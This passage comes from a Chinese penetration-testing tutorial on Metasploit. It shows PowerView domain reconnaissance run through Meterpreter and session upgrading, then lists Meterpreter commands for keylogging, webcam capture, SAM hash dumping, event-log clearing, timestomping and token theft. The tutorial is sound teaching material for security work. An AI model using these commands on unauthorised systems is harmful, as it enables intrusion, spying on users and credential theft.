operator">/</span>PowerView<span class="token punctuation">.</span>ps1      <span class="token comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span>powershell_execute Get<span class="token operator">-</span>NetDomain     <span class="token comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块</span>powershell_execute Invoke<span class="token operator">-</span>UserHunter  <span class="token comment">#该功能模块用于定位域管理员登录的主机</span>powershell_execute Get<span class="token operator">-</span>NetForest      <span class="token comment">#该模块用于定位域信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078800868-874350d3-4894-47ab-b74c-fc5c25b8e3ab.png" alt="img"></p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078802726-c92d83cc-0e53-4ab5-877d-0c6ad6556086.png" alt="img"></p><h2 id="加载stdapi"><a href="#加载stdapi" class="headerlink" title="加载stdapi"></a>加载stdapi</h2><p>有时候虽然我们获取到了meterpreter，但是执行一些命令会显示没有该命令，这时我们可以执行：load stdapi来加载，这样我们就可以执行命令了。</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078803492-948f9090-8eb6-4149-8bad-4783e074b4ae.png" alt="img"></p><h2 id="升级Session"><a href="#升级Session" class="headerlink" title="升级Session"></a>升级Session</h2><p>有时候，当我们收到的不是 meterpreter 类型的 session 的话，可能不好操作。我们可以执行命令 <strong>sessions -u id</strong> 来升级session。执行该命令，默认调用的是 <strong>post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong> 模块。</p><p><img src="/2019/03/01/gong-ju-de-shi-yong/metasploit-framework-msf-de-shi-yong/1635078803415-65d69c81-02ba-4cbc-9309-7ed49fdb9b6f.png" alt="img"></p><h2 id="Meterpreter的更多用法"><a href="#Meterpreter的更多用法" class="headerlink" title="Meterpreter的更多用法"></a>Meterpreter的更多用法</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Core Commands   核心命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command                   Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>                   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  ?                            Help menu  background         Backgrounds the current sessionbgkill                     Kills a background meterpreter scriptbglist                     Lists running background scriptsbgrun                      Executes a meterpreter script <span class="token keyword">as</span> a background threadchannel                   Displays information <span class="token keyword">or</span> control active channelsclose                      Closes a channeldisable_unicode_encoding   Disables encoding of <span class="token builtin">unicode</span> stringsenable_unicode_encoding   Enables encoding of <span class="token builtin">unicode</span> strings  exit                         Terminate the meterpreter sessionget_timeouts              Get the current session timeout values  <span class="token builtin">help</span>                       Help menu   info                        Displays information about a Post moduleirb                          Drop into irb scripting modeload                       Load one <span class="token keyword">or</span> more meterpreter extensionsmachine_id                Get the MSF ID of the machine attached to the sessionmigrate                   Migrate the server to another process    quit                      Terminate the meterpreter sessionread                      Reads data <span class="token keyword">from</span> a channelresource                  Run the commands stored <span class="token keyword">in</span> a <span class="token builtin">file</span>run                       Executes a meterpreter script <span class="token keyword">or</span> Post moduleset_timeouts              Set the current session timeout valuessleep                     Force Meterpreter to go quiet<span class="token punctuation">,</span> then re<span class="token operator">-</span>establish session<span class="token punctuation">.</span>transport                 Change the current transport mechanismuse                       Deprecated alias <span class="token keyword">for</span> <span class="token string">'load'</span>uuid                      Get the UUID <span class="token keyword">for</span> the current sessionwrite                     Writes data to a channelStdapi<span class="token punctuation">:</span> File system Commands 文件系统命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>cat           Read the contents of a <span class="token builtin">file</span> to the screencd            Change directory<span class="token builtin">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> ls<span class="token punctuation">)</span>  download      Download a <span class="token builtin">file</span> <span class="token keyword">or</span> directoryedit          Edit a <span class="token builtin">file</span>getlwd        Print local working directorygetwd         Print working directorylcd           Change local working directorylpwd          Print local working directory    ls            List filesmkdir         Make directorymv            Move source to destinationpwd           Print working directoryrm            Delete the specified <span class="token builtin">file</span>rmdir         Remove directorysearch        Search <span class="token keyword">for</span> filesshow_mount    List <span class="token builtin">all</span> mount points<span class="token operator">/</span>logical drives    upload        Upload a <span class="token builtin">file</span> <span class="token keyword">or</span> directoryStdapi<span class="token punctuation">:</span> Networking Commands 网络命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>arp                Display the host ARP cachegetproxy       Display the current proxy configuration    ifconfig        Display interfacesipconfig      Display interfaces    netstat       Display the network connectionsportfwd        Forward a local port to a remote serviceroute          View <span class="token keyword">and</span> modify the routing tableStdapi<span class="token punctuation">:</span> System Commands 系统命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>clearev       Clear the event logdrop_token    Relinquishes <span class="token builtin">any</span> active impersonation token<span class="token punctuation">.</span>execute       Execute a commandgetenv        Get one <span class="token keyword">or</span> more environment variable valuesgetpid        Get the current process identifiergetprivs      Attempt to enable <span class="token builtin">all</span> privileges available to the current processgetsid        Get the SID of the user that the server <span class="token keyword">is</span> running <span class="token keyword">as</span>  getuid        Get the user that the server <span class="token keyword">is</span> running <span class="token keyword">as</span> kill          Terminate a process ps            List running processesreboot        Reboots the remote computerreg           Modify <span class="token keyword">and</span> interact <span class="token keyword">with</span> the remote registryrev2self      Calls RevertToSelf<span class="token punctuation">(</span><span class="token punctuation">)</span> on the remote machine    shell         Drop into a system command shell    shutdown      Shuts down the remote computersteal_token   Attempts to steal an impersonation token <span class="token keyword">from</span> the target processsuspend       Suspends <span class="token keyword">or</span> resumes a <span class="token builtin">list</span> of processes  sysinfo       Gets information about the remote system<span class="token punctuation">,</span> such <span class="token keyword">as</span> OSStdapi<span class="token punctuation">:</span> User interface Commands 用户界面命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command        Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>        <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>enumdesktops       List <span class="token builtin">all</span> accessible desktops <span class="token keyword">and</span> window stationsgetdesktop             Get the current meterpreter desktopidletime                    Returns the number of seconds the remote user has been idlekeyscan_dump       Dump the keystroke <span class="token builtin">buffer</span>keyscan_start        Start capturing keystrokeskeyscan_stop        Stop capturing keystrokes    screenshot           Grab a screenshot of the interactive desktopsetdesktop              Change the meterpreters current desktop    uictl                       Control some of the user interface componentsStdapi<span class="token punctuation">:</span> Webcam Commands 摄像头命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command        Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>        <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>record_mic           Record audio <span class="token keyword">from</span> the default microphone <span class="token keyword">for</span> X secondswebcam_chat       Start a video chat   webcam_list       List webcams  webcam_snap    Take a snapshot <span class="token keyword">from</span> the specified webcamwebcam_stream   Play a video stream <span class="token keyword">from</span> the specified webcamPriv<span class="token punctuation">:</span> Elevate Commands 提权命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    getsystem     Attempt to elevate your privilege to that of local system<span class="token punctuation">.</span>Priv<span class="token punctuation">:</span> Password database Commands 密码<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    hashdump      Dumps the contents of the SAM databasePriv<span class="token punctuation">:</span> Timestomp Commands 时间戳命令<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Command       Description<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>       <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    timestomp     Manipulate <span class="token builtin">file</span> MACE attributes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关文章：<a href="https://blog.csdn.net/qq_36119192/article/details/83869141">Msfvenonm生成一个后门木马</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/89489609">渗透测试神器Cobalt Strike的使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具的使用 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
